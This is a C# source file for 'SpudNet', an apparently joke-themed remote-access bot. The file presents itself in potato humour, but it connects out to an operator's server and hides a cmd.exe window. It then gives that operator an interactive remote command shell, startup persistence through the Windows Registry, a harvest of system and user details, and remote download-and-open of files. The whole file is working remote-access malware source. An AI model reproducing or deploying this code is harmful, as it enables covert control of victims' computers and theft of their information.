using System;
using System.Diagnostics;
using System.Net.Sockets;
using System.Windows.Forms;
using Figgle;

namespace SpudBot
{
    class SpudNet
    {
        public static void Connect(String server, int port)
        {
            try
            {
                TcpClient SpudNet = new TcpClient(server, port);

                Process SpudCommand = new Process();
                SpudCommand.StartInfo.FileName = "cmd.exe";
                SpudCommand.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;                
                SpudCommand.StartInfo.UseShellExecute = false;
                SpudCommand.StartInfo.RedirectStandardOutput = true;

                string help = "\n\n - help                Print out a list of commands.\n - calc                Count Potatoes with Calculator.\n - desktop             Spudify the Desktop Background.\n - download            Download LilSpud's favorite poem.\n - fact                Send LilSpud a random Spudfact.\n - music               Play LilSpud's favorite song.\n - search              Find Potatoes Near LilSpud.\n - shell               Establish a Command Shell with LilSpud.\n - startup             Launch SpudNet on start-up.\n - status              Report the status of LilSpud.\n - whoami              Query System Information.\n - exit                Terminate the Current Session.\n";

                Byte[] data = System.Text.Encoding.ASCII.GetBytes(FiggleFonts.Standard.Render("Spudnet") + "\nA LilSpud has connected ... \nInteract with LilSpud using the following Commands:" + help);

                NetworkStream stream = SpudNet.GetStream();

                stream.Write(data, 0, data.Length);

                String responseData = String.Empty;
                   
                bool endSession = false;

                bool commandShell = true;

                while (endSession != true)
                {
                    data = new Byte[256];
                    data = System.Text.Encoding.ASCII.GetBytes("\nCommand: ");
                    stream.Write(data, 0, data.Length);

                    Int32 bytes = stream.Read(data, 0, data.Length);

                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
                    Console.WriteLine("Received: {0}", responseData);

                    switch(responseData)
                    {
                        case "help\n":
                            data = System.Text.Encoding.ASCII.GetBytes(help);
                            stream.Write(data, 0, data.Length);
                            break;                       
                        case "calc\n":
                            try
                            {
                                SpudCommand.StartInfo.Arguments = "/c calc.exe";
                                SpudCommand.Start();
                                string message = "\nSuccessfully spawned an instance of calc.exe.\n";
                                data = System.Text.Encoding.ASCII.GetBytes(message);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception calcError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", calcError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }
                            break;
                        case "desktop\n":
                            try
                            {
                                SpudWallpaper.SetWallpaper();
                                string results = "\nSuccessfully updated LilSpud's desktop backgroup!\n";
                                data = System.Text.Encoding.ASCII.GetBytes(results);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception wallpaperError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", wallpaperError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }
                            break;
                        case "download\n":
                            try
                            {
                                string openFile = SpudDownload.Download();
                                SpudCommand.StartInfo.Arguments = openFile;
                                SpudCommand.Start();                   
                                string message = @"
Successfully downloaded and displayed LilSpud's favorite poem!

I am a potato but when you hold me close I feel like the best fries in the world! -fw                                          
                                                                                        
                                  ██      ██  ██                                        
                                ██  ██  ██  ██  ██  ██████                              
                              ██  ██  ████  ██    ██    ██                              
                            ██      ██  ██    ██  ██    ██                              
                              ████  ██    ██    ██    ██                                
                                ████  ██    ██  ██  ████                                
                                ██▒▒████████████████▒▒██                                
                                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                
                                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                
                                ██▒▒██  ▒▒▒▒▒▒▒▒  ██▒▒██                                
                                ██▒▒████▒▒▒▒▒▒▒▒████▒▒██                                
                                ██▒▒▒▒▒▒▒▒████▒▒▒▒▒▒▒▒██                                
                                ██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒██                                
                                ████▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒████                                
                                  ████████████████████

";
                                data = System.Text.Encoding.ASCII.GetBytes(message);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception downloadError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", downloadError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }
                            break;
                        case "fact\n":
                            try
                            {
                                string randomSpudFact = SpudFact.DisplaySpudFact();
                                string results = "\nSuccessfully sent a Windows System Tray notification telling LilSpud the following Spudfact: " + randomSpudFact + "\n";
                                data = System.Text.Encoding.ASCII.GetBytes(results);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception factError)
                            {
                                string errorMessage = String.Format("\nAn error occured when trying to display the SpudFact: {0}", factError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                                break;
                            }
                            
                            break;
                        case "music\n":
                            try
                            {
                                SpudMusic.PlayMusic();
                                string results = "\nSuccessfully started playing LilSpud's favorite song!\n";
                                data = System.Text.Encoding.ASCII.GetBytes(results);
                                stream.Write(data, 0, data.Length);

                            }
                            catch (Exception musicError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", musicError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }                      
                            break;                     
                        case "search\n":
                            try
                            {
                                SpudSearch.Google();
                                string results = "\nSuccessfully searched for potatoes near LilSpud's!\n";
                                data = System.Text.Encoding.ASCII.GetBytes(results);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception searchError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", searchError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }
                            break;
                        case "shell\n":
                            data = System.Text.Encoding.ASCII.GetBytes("\nEstablishing a command shell with LilSpud.\n\nEnter 'exit' to disconnect the session.\n");
                            stream.Write(data, 0, data.Length);
                            while (commandShell == true)
                            {                              
                                SpudCommand.StartInfo.Arguments = "/c cd";
                                SpudCommand.Start();
                                string pwd = "\n" + SpudCommand.StandardOutput.ReadToEnd().Trim('\r', '\n') + ">";                               
                                SpudCommand.WaitForExit();
                                data = System.Text.Encoding.ASCII.GetBytes(pwd);
                                stream.Write(data, 0, data.Length);
                                Byte[] commandData = new Byte[256];
                                Int32 commandBytes = stream.Read(commandData, 0, commandData.Length);
                                string command = "/c " + System.Text.Encoding.ASCII.GetString(commandData, 0, commandBytes);
                                if (command == "/c exit\n")
                                {
                                    break;
                                } 
                                else
                                {
                                    try
                                    {
                                        SpudCommand.StartInfo.Arguments = command;
                                        SpudCommand.Start();
                                        string result = SpudCommand.StandardOutput.ReadToEnd();
                                        SpudCommand.WaitForExit();
                                        data = System.Text.Encoding.ASCII.GetBytes(result);
                                        stream.Write(data, 0, data.Length);
                                    }
                                    catch (Exception commandError)
                                    {
                                        string errorMessage = String.Format("\nAn error occured when running the command: {0}", commandError);
                                        data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                        stream.Write(data, 0, data.Length);
                                    }
                                }                                
                            }                            
                            break;
                        case "startup\n":
                            try
                            {
                                var status = SpudOnStartup.PersistanceSpud(server, port);
                                string results = string.Format("\nSuccessfully modified the Windows Registry on LilSpud so that Spudnet will connect to {0}:{1} on startup.\n", server, port);
                                data = System.Text.Encoding.ASCII.GetBytes(results);
                                stream.Write(data, 0, data.Length);
                            }
                            catch (Exception persistanceError)
                            {
                                string errorMessage = String.Format("\nAn error occured when running the command: {0}", persistanceError);
                                data = System.Text.Encoding.ASCII.GetBytes(errorMessage);
                                stream.Write(data, 0, data.Length);
                            }
                            break;
                        case "status\n":
                            data = System.Text.Encoding.ASCII.GetBytes("\nLilSpud is still connected ...\n");
                            stream.Write(data, 0, data.Length);
                            break;
                        case "whoami\n":
                            var (hostname, username, domain, address, version) = SpudFinder.GetInfo();
                            Byte[] systeminfo = System.Text.Encoding.ASCII.GetBytes(String.Format("\nHostname: {0}\nUserName: {1}\nDomain: {2}\nIP Address: {3}\nOS: {4}\n", hostname, username, domain, address, version));
                            stream.Write(systeminfo, 0, systeminfo.Length);
                            break;
                        case "exit\n":
                            data = System.Text.Encoding.ASCII.GetBytes("\nDisconnecting the session with LilSpud!\n");
                            stream.Write(data, 0, data.Length);
                            endSession = true;
                            break;
                        default:
                            data = System.Text.Encoding.ASCII.GetBytes("\nUse 'help' to print out a list of commands ...\n");
                            stream.Write(data, 0, data.Length);
                            break;
                    }
                }
                stream.Close();
                SpudNet.Close();
                Application.Exit();
            }            
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }
        }
    }
}